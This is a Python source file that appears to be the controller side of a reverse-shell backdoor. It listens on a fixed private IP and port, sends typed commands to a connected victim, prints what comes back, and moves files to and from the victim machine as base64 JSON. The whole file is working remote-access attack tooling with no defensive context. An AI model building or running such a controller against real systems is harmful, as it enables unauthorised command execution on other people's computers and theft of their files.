import socket
import simplejson
import base64

class SocketListener():
    def __init__(self, host, port):
        myListener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        myListener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  
        myListener.bind((host, port))
        myListener.listen(1)  
        print("Listening...")
        (self.myConnection,myAdress) = myListener.accept()  
        print("Connected to ip " + str(myAdress[0]) + " and to port " + str(myAdress[1]))

    def saveFile(self, path, content):
        with open(path, "wb") as myFile:
            myFile.write(base64.b64decode(content))
            return "Download OK!"

    def getFileContents(self,path):# upload işlemi için
        with open(path,"rb") as MyFile:
            return base64.b64encode(MyFile.read())

    def jsonSend(self, data):
        jsonData = simplejson.dumps(data)
        return self.myConnection.send(jsonData.encode("utf-8"))

    def jsonRecv(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.myConnection.recv(1024).decode()
                return simplejson.loads(jsonData)
            except ValueError:
                continue

    def commandExecuter(self, commandInput):

        self.jsonSend(commandInput)  
        if commandInput[0] == "quit": 
            self.myConnection.close()
            print("Connection closed")
            exit()
        return self.jsonRecv() 

    def startListener(self):
        while True:
            commandInput = input("Enter Command> ")
            commandInput = commandInput.split(" ")  
            try:
                if commandInput[0] == "upload":
                    myFileContent = self.getFileContents(commandInput[1])
                    commandInput.append(myFileContent)
                commandOutput = self.commandExecuter(commandInput) 
                                                                    
                if commandInput[0] == "download" and "Error!" not in commandOutput:  
                    commandOutput = self.saveFile(commandInput[1], commandOutput)
            except Exception:
                commandOutput="Error!"

            print(commandOutput)

mySocketListener = SocketListener("10.0.1.15", 8080)
mySocketListener.startListener()

